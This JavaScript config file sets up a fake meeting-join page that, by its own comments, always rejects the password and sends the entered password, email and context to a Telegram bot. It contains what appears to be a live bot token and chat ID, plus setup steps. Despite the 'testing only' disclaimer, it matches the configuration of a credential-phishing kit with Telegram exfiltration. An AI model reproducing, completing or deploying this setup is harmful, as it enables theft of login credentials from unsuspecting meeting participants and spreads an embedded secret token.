// config.js
// Telegram Bot configuration for testing the pre-join password capture
// 
// ⚠️  This is a TESTING / SIMULATION app only.
// Everyone using or viewing this application is aware it is for testing purposes.
// The "Join meeting" button deliberately fails with "Password incorrect" and logs the entered
// password + email + full context to Telegram.
//
// DO NOT put real production credentials here. Use a dedicated test bot.
// Gitignore this file in real repos if it contains sensitive tokens.

export const TG_BOT_TOKEN = "8737352649:AAGYMC7yrghvLH8ZsLRaWEFC7OcjFXpSMSA";   // e.g. 123456789:AAH...
export const TG_CHAT_ID = "7630147358";     // e.g. 123456789 or @your_test_channel

// Quick setup reminder:
// 1. Open Telegram → search @BotFather → /newbot → give it a name → copy the token above
// 2. Start a private chat with your new bot (or add it to a test channel)
// 3. Visit in browser: https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates
//    Look for "chat":{"id": ... }  → that's your chat ID
// 4. Paste both values above, save, then reload the React app.
// 
// The UI will pre-fill the "Telegram Test Integration" panel with these values.
// You can still edit them live in the UI for quick testing of different bots/chats.
